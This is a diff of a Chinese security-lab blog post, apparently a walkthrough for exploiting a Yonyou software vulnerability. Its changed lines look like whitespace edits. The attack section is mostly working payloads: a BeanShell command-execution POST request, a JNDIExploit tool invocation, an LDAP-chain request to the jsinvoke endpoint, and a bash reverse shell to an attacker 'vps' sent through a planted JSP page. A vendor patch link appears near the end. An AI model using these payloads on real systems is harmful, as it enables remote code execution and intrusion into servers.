@@ -75,7 +75,7 @@ POST 请求，响应存在漏洞
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hABfIKLDNyvCqAuIrBGgTebiaPO9HvpAcWXDpZn1Ysln3vzPlzEsK0zP8hhmKugGepXA4MXRgNBOTA/640?wx_fmt=png)
 
-       命令执行操作（ipconfig）
+       命令执行操作（ipconfig）
 
 ```
 POST /302.jsp?error=bsh.Interpreter HTTP/1.1
@@ -94,11 +94,11 @@ cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec("ipconfig")
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hABfIKLDNyvCqAuIrBGgTeb82v7kOAY3fniaibsR3qnBGsyLtibNrmQxhArJbPLjosNpbouIEdA2Dohw/640?wx_fmt=png)
 
-     3. 反弹 shell 参考这篇文章。
+     3. 反弹 shell 参考这篇文章。
 
-    [  https://mp.weixin.qq.com/s/Qgoo8OdJH4fUtreqdXR-3Q](https://mp.weixin.qq.com/s?__biz=MzU2NDgzOTQzNw==&mid=2247495908&idx=1&sn=12bd56daa5daa85c581307fdf66b4874&scene=21#wechat_redirect)
+    [  https://mp.weixin.qq.com/s/Qgoo8OdJH4fUtreqdXR-3Q](https://mp.weixin.qq.com/s?__biz=MzU2NDgzOTQzNw==&mid=2247495908&idx=1&sn=12bd56daa5daa85c581307fdf66b4874&scene=21#wechat_redirect)
 
-      利用 JNDI 注入工具 TomcatEcho 回显链
+      利用 JNDI 注入工具 TomcatEcho 回显链
 
 ```
  java -jar JNDIExploit-1.4-SNAPSHOT.jar -u
@@ -107,11 +107,11 @@ cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec("ipconfig")
 
 ![](https://mmbiz.qpic.cn/mmbiz_png/MjmKb3ap0hABfIKLDNyvCqAuIrBGgTebNvb8KYFOafuzZsPpiaLcxoc9CTPhjxBwbwL6nMRRsERWRBscDjJ5p0w/640?wx_fmt=png)
 
-    使用 ladp 加载利用链 
+    使用 ladp 加载利用链 
 
 ```
 POST /uapjs/jsinvoke/?action=invoke HTTP/1.1
-Host: 127.138.100.158:8080
+Host: 127.138.100.158:8080
 Connection: Keep-Alive
 Content-Length: 253
 Content-Type: application/x-www-form-urlencoded
@@ -128,14 +128,14 @@ vps 开始 ladp 监听
 bash 反弹 shell
 
 ```
-GET /301.jsp HTTP/1.1
-Host: 127.0.0.1
+GET /301.jsp HTTP/1.1
+Host: 127.0.0.1
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
-cmd: bash -i >& /dev/tcp/vps/12388 0>&1
+cmd: bash -i >& /dev/tcp/vps/12388 0>&1
 
 ```
 
@@ -166,7 +166,7 @@ https://dsp.yonyou.com/patchcenter/patchdetail/11231678267338650434/0/2
 
 口号 网安引领时代，弥天点亮未来
 
-![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaqjXT4YxgHVARD1NNv0RvKtiaAvXhmruVqgavPY3stwrfvLKetGycKUfxIq3Xc6F6dhU7eb4oh2gg/640?wx_fmt=gif&wxfrom=5&wx_lazy=1) 
+![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaqjXT4YxgHVARD1NNv0RvKtiaAvXhmruVqgavPY3stwrfvLKetGycKUfxIq3Xc6F6dhU7eb4oh2gg/640?wx_fmt=gif&wxfrom=5&wx_lazy=1) 
 
 知识分享完了
 
@@ -178,7 +178,7 @@ https://dsp.yonyou.com/patchcenter/patchdetail/11231678267338650434/0/2
 
 必降弥天之润！
 
-   弥  天
+   弥  天
 
 安全实验室  
 
